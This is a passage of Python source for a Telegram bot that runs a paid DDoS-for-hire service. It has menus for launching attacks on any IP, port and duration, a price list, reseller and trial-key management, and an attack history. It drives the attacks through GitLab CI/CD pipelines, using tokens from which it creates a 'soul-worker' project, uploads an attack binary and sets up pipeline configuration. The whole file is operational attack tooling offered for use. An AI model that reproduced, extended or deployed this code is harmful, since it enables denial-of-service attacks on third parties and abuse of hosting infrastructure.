        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to look up:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def user_stats(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        user_id_str = str(user_id)
        attacks_used = user_attack_counts.get(user_id_str, 0)
        remaining = MAX_ATTACKS - attacks_used
        await update.message.reply_text(
            f"📈 **YOUR STATS**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"Attacks used: {attacks_used}\n"
            f"Remaining attacks: {remaining}/{MAX_ATTACKS}\n"
            f"Cooldown: {COOLDOWN_DURATION}s"
        )
        return

    top_users = sorted(user_attack_counts.items(), key=lambda item: item[1], reverse=True)[:5]
    stats_text = (
        "📈 **USER STATS**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total tracked users: {len(user_attack_counts)}\n"
        f"Total attack records: {len(attack_history)}\n\n"
        "Top users by attack count:\n"
    )
    if top_users:
        for user_id_str, count in top_users:
            stats_text += f"• `{user_id_str}` - {count} attacks\n"
    else:
        stats_text += "No user attack data yet.\n"

    await update.message.reply_text(stats_text)

async def show_bot_settings(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "⚙️ **BOT SETTINGS**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}\n"
        f"⏱️ Cooldown: {COOLDOWN_DURATION}s\n"
        f"🎯 Max Attacks: {MAX_ATTACKS}\n\n"
        "Select an option below:"
    )

    reply_markup = get_bot_settings_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def show_owner_panel(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "👑 **OWNER PANEL**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Owner-only management options\n\n"
        "Select an option below:"
    )

    reply_markup = get_owner_panel_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

async def show_token_management(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    message = (
        "🔑 **TOKEN MANAGEMENT**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"Total Groups: {len(gitlab_tokens)}\n\n"  # Changed "Servers" to "Groups"
        "Select an option below:"
    )

    reply_markup = get_token_management_keyboard()
    await update.message.reply_text(message, reply_markup=reply_markup)

# ==================== ATTACK HANDLERS ====================

async def launch_attack_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**\nYou are not authorized to attack.")
        return

    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return

    if not gitlab_tokens:
        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers available. Contact admin.")
        return

    temp_data[user_id] = {"step": "attack_ip"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🎯 **LAUNCH ATTACK - STEP 1/3**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Please send the target IP address:\n\n"
        "Example: `192.168.1.1`\n\n"
        "⚠️ IPs starting with '15' or '96' are not allowed",
        reply_markup=reply_markup
    )

async def check_status(update: Update, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    attack_status = get_attack_status()

    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = (
            "🔥 **ATTACK RUNNING**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Target: `{attack['ip']}:{attack['port']}`\n"
            f"⏱️ Elapsed: `{attack_status['elapsed']}s`\n"
            f"⏳ Remaining: `{attack_status['remaining']}s`\n"
            f"⚡ Method: `{attack['method']}`"
        )
    elif attack_status["status"] == "cooldown":
        message = (
            "⏳ **COOLDOWN**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Remaining: `{attack_status['remaining_cooldown']}s`\n"
            f"⏰ Next attack in: `{attack_status['remaining_cooldown']}s`"
        )
    else:
        message = (
            "✅ **READY**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "No attack running.\n"
            "You can start a new attack."
        )

    await update.message.reply_text(message)

async def quick_launch_start(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**\nYou are not authorized to attack.")
        return

    can_start, message = can_start_attack(user_id)
    if not can_start:
        await update.message.reply_text(message)
        return

    if not gitlab_tokens:
        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers available. Contact admin.")
        return

    temp_data[user_id] = {"step": "quick_launch"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "⚡ **QUICK LAUNCH**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the target and duration in one line:\n"
        "`IP PORT DURATION`\n"
        "Example: `4.247.148.41 21528 120`\n\n"
        "The bot will start the attack immediately.",
        reply_markup=reply_markup
    )

async def attack_history_handler(update: Update, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if is_owner(user_id) or is_admin(user_id):
        recent = attack_history[-10:]
        header = "👑 **ATTACK HISTORY (ADMIN)**"
    else:
        recent = [entry for entry in attack_history if entry["user_id"] == user_id][-5:]
        header = "📈 **YOUR ATTACK HISTORY**"

    if not recent:
        await update.message.reply_text(f"{header}\n━━━━━━━━━━━━━━━━━━━━━\nNo attacks recorded yet.")
        return

    history_text = f"{header}\n━━━━━━━━━━━━━━━━━━━━━\n"
    for entry in recent[-10:]:
        user_label = f"User: `{entry['user_id']}`"
        history_text += (
            f"• {entry['timestamp']} - {entry['ip']}:{entry['port']} "
            f"for `{entry['time']}s` via `{entry['method']}` ({user_label})\n"
        )

    await update.message.reply_text(history_text)

async def stop_attack_handler(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id):
    if not can_user_attack(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    attack_status = get_attack_status()

    if attack_status["status"] != "running":
        await update.message.reply_text("❌ **NO ACTIVE ATTACK**\nNo attack is running.")
        return

    if not gitlab_tokens:
        await update.message.reply_text("❌ **NO SERVERS AVAILABLE**")
        return

    await update.message.reply_text("🛑 **STOPPING ATTACK...**")

    total_stopped = 0
    success_count = 0

    threads = []
    results = []

    def stop_single_token(token_data):
        try:
            stopped = instant_stop_all_jobs(
                token_data['token'],
                token_data['group_id']  # Changed from project_id to group_id
            )
            results.append((token_data.get('group_name', f"Group {token_data['group_id']}"), stopped))
        except Exception as e:
            results.append((token_data.get('group_name', f"Group {token_data['group_id']}"), 0))

    for token_data in gitlab_tokens:
        thread = threading.Thread(target=stop_single_token, args=(token_data,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    for group_name, stopped in results:
        total_stopped += stopped
        if stopped > 0:
            success_count += 1

    stop_attack()

    message = (
        f"🛑 **ATTACK STOPPED**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ Pipelines cancelled: {total_stopped}\n"
        f"✅ Groups: {success_count}/{len(gitlab_tokens)}\n"
        f"⏳ Cooldown: {COOLDOWN_DURATION}s"
    )

    await update.message.reply_text(message)

async def my_access(update: Update, user_id):
    if is_owner(user_id):
        if is_primary_owner(user_id):
            role = "👑 PRIMARY OWNER"
        else:
            role = "👑 OWNER"
        expiry = "LIFETIME"
    elif is_admin(user_id):
        role = "🛡️ ADMIN"
        expiry = "LIFETIME"
    elif is_reseller(user_id):
        role = "💰 RESELLER"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    elif is_approved_user(user_id):
        role = "👤 APPROVED USER"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "EXPIRED"
                else:
                    expiry_date = time.strftime("%Y-%m-%d", time.localtime(expiry_time))
                    expiry = expiry_date
            except:
                pass
    else:
        role = "⏳ PENDING"
        expiry = "Waiting for approval"

    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks

    message = (
        f"📋 **YOUR ACCESS INFO**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Role: {role}\n"
        f"🎯 Attacks Used: {current_attacks}/{MAX_ATTACKS}\n"
        f"🎯 Remaining: {remaining_attacks}\n"
        f"📅 Expiry: {expiry}\n"
        f"🆔 Your ID: `{user_id}`"
    )

    await update.message.reply_text(message)

# ==================== TOKEN MANAGEMENT HANDLERS ====================

async def add_token_start(update: Update, user_id):
    """Modified to use group_id instead of project_id"""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "token_add"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➕ **ADD TOKEN**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send token and group ID in format:\n"
        "`token,group_id`\n\n"
        "Example:\n"
        "`glpat-xxxxxxxxxxxxxxxxxxxx,12345678`\n\n"
        "⚡ The bot will automatically:\n"
        "• Find or create 'soul-worker' project\n"
        "• Upload binary file\n"
        "• Setup CI/CD configuration",
        reply_markup=reply_markup
    )

async def upload_token_file_start(update: Update, user_id):
    """NEW FUNCTION: Start bulk token upload from file"""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "token_file_upload"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📤 **UPLOAD TOKEN FILE**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Please upload a .txt file with the following format:\n\n"
        "`token1,group_id1`\n"
        "`token2,group_id2`\n"
        "`token3,group_id3`\n\n"
        "Example:\n"
        "`glpat-xxxxxxxxxxxxxxxxxxxx,12345678`\n"
        "`glpat-yyyyyyyyyyyyyyyyyyyy,87654321`\n\n"
        "⚡ For each valid token/group:\n"
        "• Find or create 'soul-worker' project\n"
        "• Upload binary file\n"
        "• Setup CI/CD configuration\n\n"
        "⚠️ Invalid tokens will be skipped",
        reply_markup=reply_markup
    )

async def list_tokens(update: Update, user_id):
    """Modified to show group_id instead of project_id"""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not gitlab_tokens:
        await update.message.reply_text("📋 **NO TOKENS**\nNo GitLab tokens configured.")
        return

    token_list = f"📋 **CONFIGURED GROUPS** ({len(gitlab_tokens)})\n" + "━" * 25 + "\n\n"

    for idx, token in enumerate(gitlab_tokens, 1):
        group_name = token.get('group_name', 'Unknown')
        group_id = token.get('group_id', 'Unknown')
        project_name = token.get('project_name', 'Unknown')
        status = token.get('status', 'unknown')
        added_date = token.get('added_date', 'Unknown')

        token_list += (
            f"{idx}. **{group_name}**\n"
            f"   └ Group ID: `{group_id}`\n"
            f"   └ Project: `{project_name}`\n"
            f"   └ Status: {status}\n"
            f"   └ Added: {added_date}\n\n"
        )

        if idx % 10 == 0 and idx < len(gitlab_tokens):
            token_list += "━" * 25 + "\n\n"

    await update.message.reply_text(token_list[:4000])

async def remove_token_start(update: Update, user_id):
    """Modified for group-based tokens"""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not gitlab_tokens:
        await update.message.reply_text("📋 **NO TOKENS**\nNo GitLab tokens to remove.")
        return

    token_list = "🗑️ **REMOVE TOKEN**\n" + "━" * 25 + "\n\n"
    for idx, token in enumerate(gitlab_tokens, 1):
        group_name = token.get('group_name', 'Unknown')
        group_id = token.get('group_id', 'Unknown')
        token_list += f"{idx}. {group_name} (Group ID: {group_id})\n"

    token_list += f"\n━" * 25 + f"\n\nSend the number (1-{len(gitlab_tokens)}) to remove:"

    temp_data[user_id] = {"step": "token_remove"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(token_list, reply_markup=reply_markup)

async def remove_expired_tokens(update: Update, user_id):
    """Modified for group-based tokens"""
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not gitlab_tokens:
        await update.message.reply_text("📋 **NO TOKENS**")
        return

    await update.message.reply_text("🔄 **CHECKING TOKENS...**")

    valid_tokens = []
    expired_tokens = []

    for token_data in gitlab_tokens:
        try:
            gl = gitlab.Gitlab('https://gitlab.com', private_token=token_data['token'])
            gl.auth()

            # Try to access the group
            group_id = token_data.get('group_id')
            group = gl.groups.get(group_id)

            valid_tokens.append(token_data)
        except:
            expired_tokens.append(token_data)

    if not expired_tokens:
        await update.message.reply_text("✅ **ALL TOKENS VALID**\nNo expired tokens found.")
        return

    gitlab_tokens.clear()
    gitlab_tokens.extend(valid_tokens)
    save_gitlab_tokens(gitlab_tokens)

    expired_list = f"🧹 **REMOVED {len(expired_tokens)} EXPIRED TOKENS**\n" + "━" * 25 + "\n\n"
    for token in expired_tokens[:10]:
        group_name = token.get('group_name', 'Unknown')
        group_id = token.get('group_id', 'Unknown')
        expired_list += f"• `{group_name}` - Group ID: {group_id}\n"

    expired_list += f"\n📊 **Remaining Tokens:** {len(valid_tokens)}"
    await update.message.reply_text(expired_list)

# ==================== USER MANAGEMENT HANDLERS (Continued from original) ====================

async def add_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "add_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➕ **ADD USER - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to add:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def remove_user_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "remove_user_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "➖ **REMOVE USER**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to remove:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def users_list(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not approved_users:
        await update.message.reply_text("📋 **NO APPROVED USERS**")
        return

    user_list = f"📋 **APPROVED USERS** ({len(approved_users)})\n" + "━" * 25 + "\n\n"

    for idx, (uid, data) in enumerate(approved_users.items(), 1):
        username = data.get('username', 'Unknown')
        expiry = data.get('expiry', 'Unknown')

        if expiry == "LIFETIME":
            expiry_text = "LIFETIME"
        else:
            try:
                expiry_date = time.strftime("%Y-%m-%d", time.localtime(float(expiry)))
                expiry_text = expiry_date
            except:
                expiry_text = "Unknown"

        user_list += f"{idx}. @{username}\n   └ ID: `{uid}`\n   └ Expiry: {expiry_text}\n\n"

        if idx % 20 == 0:
            await update.message.reply_text(user_list)
            user_list = ""

    if user_list:
        await update.message.reply_text(user_list)

async def pending_requests(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not pending_users:
        await update.message.reply_text("⏳ **NO PENDING REQUESTS**")
        return

    request_list = f"⏳ **PENDING REQUESTS** ({len(pending_users)})\n" + "━" * 25 + "\n\n"

    for idx, user in enumerate(pending_users, 1):
        username = user.get('username', 'Unknown')
        user_id_val = user.get('user_id', 'Unknown')
        request_date = user.get('request_date', 'Unknown')

        request_list += f"{idx}. @{username}\n   └ ID: `{user_id_val}`\n   └ Date: {request_date}\n\n"

    await update.message.reply_text(request_list)

async def gen_trial_key_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    keyboard = [
        [InlineKeyboardButton("6 hours", callback_data="trial_6"),
         InlineKeyboardButton("12 hours", callback_data="trial_12"),
         InlineKeyboardButton("24 hours", callback_data="trial_24")],
        [InlineKeyboardButton("48 hours", callback_data="trial_48"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🔑 **GENERATE TRIAL KEY**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Select trial duration:",
        reply_markup=reply_markup
    )

async def price_list(update: Update):
    message = (
        "💰 **PRICE LIST**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n\n"
        "**USER PRICES:**\n"
        "• 1 Day: ₹120\n"
        "• 2 Days: ₹240\n"
        "• 3 Days: ₹360\n"
        "• 4 Days: ₹450\n"
        "• 7 Days: ₹650\n\n"
        "**RESELLER PRICES:**\n"
        "• 1 Day: ₹150\n"
        "• 2 Days: ₹250\n"
        "• 3 Days: ₹300\n"
        "• 4 Days: ₹400\n"
        "• 7 Days: ₹550"
    )
    await update.message.reply_text(message)

# ==================== OWNER MANAGEMENT (Continued) ====================

async def add_owner_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "owner_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "👑 **ADD OWNER - STEP 1/2**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to add as owner:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def remove_owner_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "owner_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🗑️ **REMOVE OWNER**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the owner ID to remove:\n\n"
        "Example: `123456789`\n\n"
        "⚠️ Cannot remove primary owners",
        reply_markup=reply_markup
    )

async def owner_list(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not owners:
        await update.message.reply_text("📋 **NO OWNERS**")
        return

    owner_list_text = f"👑 **OWNERS LIST** ({len(owners)})\n" + "━" * 25 + "\n\n"

    for uid, data in owners.items():
        username = data.get('username', 'Unknown')
        is_primary = data.get('is_primary', False)
        added_date = data.get('added_date', 'Unknown')

        owner_list_text += (
            f"{'👑 PRIMARY' if is_primary else '👤'} @{username}\n"
            f"   └ ID: `{uid}`\n"
            f"   └ Added: {added_date}\n\n"
        )

    await update.message.reply_text(owner_list_text)

# ==================== RESELLER MANAGEMENT (Continued) ====================

async def add_reseller_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "reseller_add_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "💰 **ADD RESELLER - STEP 1/3**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the user ID to add as reseller:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def remove_reseller_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "reseller_remove_id"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "🗑️ **REMOVE RESELLER**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the reseller ID to remove:\n\n"
        "Example: `123456789`",
        reply_markup=reply_markup
    )

async def reseller_list(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not resellers:
        await update.message.reply_text("💰 **NO RESELLERS**")
        return

    reseller_list_text = f"💰 **RESELLERS LIST** ({len(resellers)})\n" + "━" * 25 + "\n\n"

    for uid, data in resellers.items():
        username = data.get('username', 'Unknown')
        credits = data.get('credits', 0)
        added_date = data.get('added_date', 'Unknown')

        reseller_list_text += (
            f"💰 @{username}\n"
            f"   └ ID: `{uid}`\n"
            f"   └ Credits: {credits}\n"
            f"   └ Added: {added_date}\n\n"
        )

    await update.message.reply_text(reseller_list_text)

# ==================== BOT SETTINGS (Continued) ====================

async def toggle_maintenance(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    global MAINTENANCE_MODE
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)

    status = "ON 🔴" if MAINTENANCE_MODE else "OFF 🟢"
    await update.message.reply_text(
        f"🔧 **MAINTENANCE MODE**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        f"Status: {status}"
    )

async def set_cooldown_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    keyboard = [
        [InlineKeyboardButton("20s", callback_data="cooldown_20"),
         InlineKeyboardButton("30s", callback_data="cooldown_30"),
         InlineKeyboardButton("40s", callback_data="cooldown_40")],
        [InlineKeyboardButton("60s", callback_data="cooldown_60"),
         InlineKeyboardButton("120s", callback_data="cooldown_120"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "⏱️ **SET COOLDOWN**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Select cooldown duration:",
        reply_markup=reply_markup
    )

async def set_max_attacks_start(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    keyboard = [
        [InlineKeyboardButton("1", callback_data="maxattack_1"),
         InlineKeyboardButton("5", callback_data="maxattack_5"),
         InlineKeyboardButton("10", callback_data="maxattack_10")],
        [InlineKeyboardButton("20", callback_data="maxattack_20"),
         InlineKeyboardButton("50", callback_data="maxattack_50"),
         InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "🎯 **SET MAX ATTACKS**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Select maximum attacks per user:",
        reply_markup=reply_markup
    )

async def admin_list(update: Update, user_id):
    if not (is_owner(user_id) or is_admin(user_id)):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    if not admins:
        await update.message.reply_text("📋 **NO ADMINS**\nOnly owners configured.")
        return

    admin_list_text = f"🛡️ **ADMINS LIST** ({len(admins)})\n" + "━" * 25 + "\n\n"

    for uid, data in admins.items():
        username = data.get('username', 'Unknown')
        added_date = data.get('added_date', 'Unknown')

        admin_list_text += (
            f"🛡️ @{username}\n"
            f"   └ ID: `{uid}`\n"
            f"   └ Added: {added_date}\n\n"
        )

    await update.message.reply_text(admin_list_text)

# ==================== BROADCAST (Continued) ====================

async def broadcast_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "broadcast_message"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📢 **BROADCAST MESSAGE**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send the message to broadcast to all users:",
        reply_markup=reply_markup
    )

async def upload_binary_start(update: Update, user_id):
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **ACCESS DENIED**")
        return

    temp_data[user_id] = {"step": "binary_upload"}
    reply_markup = get_cancel_keyboard()
    await update.message.reply_text(
        "📤 **UPLOAD BINARY FILE**\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Send your binary file.\n"
        "It will be uploaded to all configured groups.",
        reply_markup=reply_markup
    )

# ==================== HELP HANDLER ====================

async def help_handler(update: Update, user_id):
    if is_owner(user_id) or is_admin(user_id):
        message = (
            "🆘 **HELP - AVAILABLE FEATURES**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "**For All Users:**\n"
            "• Launch Attack - Start DDoS attack\n"
            "• Check Status - View attack status\n"
            "• Stop Attack - Stop running attack\n"
            "• My Access - Check your access info\n\n"
            "**Admin Features:**\n"
            "• User Management - Add/remove users\n"
            "• Bot Settings - Configure bot\n\n"
            "**Owner Features:**\n"
            "• Owner Panel - Manage owners/resellers\n"
            "• Token Management - Manage GitLab groups\n"
            "• Upload Token File - Bulk upload tokens\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Need help? Contact admin."
        )
    elif can_user_attack(user_id):
        message = (
            "🆘 **HELP - AVAILABLE FEATURES**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "• Launch Attack - Start DDoS attack\n"
            "• Quick Launch - Start attack in one line\n"
            "• Check Status - View attack status\n"
            "• Attack History - Review recent attacks\n"
            "• Stop Attack - Stop running attack\n"
            "• My Access - Check your access info\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "Need help? Contact admin."
        )
    else:
        message = (
            f"🆘 **HELP**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            "**To Get Access:**\n"
            "1. Use /start to request\n"
            "2. Contact admin\n"
            "3. Wait for approval\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Your ID:** `{user_id}`"
        )

    await update.message.reply_text(message)

# ==================== TEXT INPUT HANDLER ====================

async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id, text):
    if user_id not in temp_data:
        return

    step = temp_data[user_id].get("step")

    # Attack flow
    if step == "attack_ip":
        ip = text.strip()
        if not is_valid_ip(ip):
            await update.message.reply_text("⚠️ **INVALID IP**\nIPs starting with '15' or '96' are not allowed.\n\nPlease send a valid IP:")
            return

        method, method_name = get_attack_method(ip)
        if method is None:
            await update.message.reply_text(f"⚠️ **INVALID IP**\n{method_name}\n\nPlease send a valid IP:")
            return

        temp_data[user_id] = {"step": "attack_port", "ip": ip, "method": method}
        await update.message.reply_text(
            "🎯 **LAUNCH ATTACK - STEP 2/3**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ IP: `{ip}`\n\n"
            "Send the target PORT:\n\nExample: `80` or `443`"
        )

    elif step == "attack_port":
        try:
            port = int(text.strip())
            if port <= 0 or port > 65535:
                await update.message.reply_text("❌ **INVALID PORT**\nPort must be between 1 and 65535.\n\nPlease send a valid port:")
                return

            temp_data[user_id]["port"] = port
            temp_data[user_id]["step"] = "attack_time"

            # Show inline keyboard for attack duration
            keyboard = [
                [InlineKeyboardButton("30s", callback_data="attack_time_30"),
                 InlineKeyboardButton("60s", callback_data="attack_time_60"),
                 InlineKeyboardButton("90s", callback_data="attack_time_90")],
                [InlineKeyboardButton("120s", callback_data="attack_time_120"),
                 InlineKeyboardButton("180s", callback_data="attack_time_180"),
                 InlineKeyboardButton("300s", callback_data="attack_time_300")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_operation")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)

            await update.message.reply_text(
                "🎯 **LAUNCH ATTACK - STEP 3/3**\n"
                "━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ IP: `{temp_data[user_id]['ip']}`\n"
                f"✅ Port: `{port}`\n\n"
                "Select attack duration:",
                reply_markup=reply_markup
            )

        except ValueError:
            await update.message.reply_text("❌ **INVALID PORT**\nPort must be a number.\n\nPlease send a valid port:")

    elif step == "quick_launch":
        clean_text = text.replace(':', ' ').replace(',', ' ')
        parts = [p.strip() for p in clean_text.split() if p.strip()]
        if len(parts) != 3:
            await update.message.reply_text(
                "❌ **INVALID FORMAT**\n"
                "Send the target as `IP PORT DURATION`.\n"
                "Example: `4.247.148.41 21528 120`"
            )
            return

        ip, port_str, duration_str = parts
        if not is_valid_ip(ip):
            await update.message.reply_text(
                "⚠️ **INVALID IP**\nIPs starting with '15' or '96' are not allowed.\n\nPlease send a valid target."
            )
            return

        try:
            port = int(port_str)
            attack_duration = int(duration_str)
            if port <= 0 or port > 65535 or attack_duration <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text(
                "❌ **INVALID INPUT**\nPort must be 1-65535 and duration must be a positive number.\n\nTry again: `IP PORT DURATION`"
            )
            return

        method, method_name = get_attack_method(ip)
        if method is None:
            await update.message.reply_text(f"⚠️ **INVALID IP**\n{method_name}\n\nPlease send a valid target.")
            return

        if not gitlab_tokens:
            await update.message.reply_text("❌ **NO SERVERS AVAILABLE**\nNo servers available. Contact admin.")
            return

        del temp_data[user_id]
        start_attack(ip, port, attack_duration, user_id, method)

        results = process_attack_tokens(ip, port, attack_duration, method)
        success_count = sum(1 for _, success in results if success)
        fail_count = len(results) - success_count

        reply_markup = get_main_keyboard(user_id)
        await update.message.reply_text(
            f"🎯 **QUICK ATTACK STARTED**\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Target: `{ip}`\n"
            f"🚪 Port: `{port}`\n"
            f"⏱️ Duration: `{attack_duration}s`\n"
            f"🖥️ Groups: `{success_count}`\n"
            f"⚡ Method: {method}\n"
            f"⏳ Cooldown: {COOLDOWN_DURATION}s after attack",
            reply_markup=reply_markup
        )

        def monitor_attack_completion():
            time.sleep(attack_duration)
            finish_attack()
            logger.info(f"Attack completed automatically after {attack_duration} seconds")

